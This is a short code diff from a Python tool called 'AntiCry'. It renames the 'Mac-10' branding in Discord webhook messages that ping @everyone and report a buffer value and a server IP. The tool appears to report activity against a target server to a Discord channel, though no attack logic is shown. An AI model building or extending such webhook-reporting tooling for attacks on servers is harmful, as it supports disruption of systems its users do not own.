@@ -332,7 +332,7 @@ class AntiCry:
                             },
                         ],
                         "author": {
-                            "name": f"Mac-10",
+                            "name": f"AntiCry",
                             "icon_url": "https://cdn.discordapp.com/emojis/1087616875892056094.gif?size=96&quality=lossless"
                         },
                         "footer": {
@@ -342,9 +342,9 @@ class AntiCry:
                     }
 
             heading = {
-                "content": f"**Mac-10** ||@everyone||",
+                "content": f"**AntiCry** ||@everyone||",
                 "embeds": [embed],
-                "username": "Mac-10"
+                "username": "AntiCry"
             }
             req = post(VARIABLES.webhook, headers={"content-type": "application/json"}, data=json.dumps(heading).encode())
 
@@ -374,10 +374,10 @@ class AntiCry:
                                     \nBUFFER -> {VARIABLES.buffer}\nSERVER -> {VARIABLES.serverip}```"""
                             }
                         ],
-                        "author": {"name": f"Mac-10"},
+                        "author": {"name": f"AntiCry"},
                         "footer": {"text": f".gg/kos"},
                     }
-            heading = { "content": "", "embeds": [embed], "username": "Mac-10" }
+            heading = { "content": "", "embeds": [embed], "username": "AntiCry" }
             req = post(VARIABLES.webhook, headers={"content-type": "application/json"}, data=json.dumps(heading).encode())
 
         def Main(self):
